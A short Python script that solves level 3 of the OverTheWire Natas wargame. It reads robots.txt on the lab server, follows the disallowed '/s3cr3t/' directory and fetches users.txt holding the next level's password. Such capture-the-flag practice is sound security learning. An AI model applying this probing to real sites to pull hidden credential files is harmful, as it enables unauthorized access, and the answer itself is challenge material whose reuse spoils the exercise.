"""
Help script to resolve natas challenge #3
"""
import requests
import json

level = 'natas3'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
The "not even Google" comment is the hint: search engines use the file robots.txt to get
information about the site and index them accordingly.
"""
response = requests.get(url + '/robots.txt', auth=auth)
print(response.text)  # This reveals the directory.
response = requests.get(url + '/s3cr3t/', auth=auth)
print(response.text)  # Browse to find the correct file.
response = requests.get(url + '/s3cr3t/users.txt', auth=auth)
print(response.text)
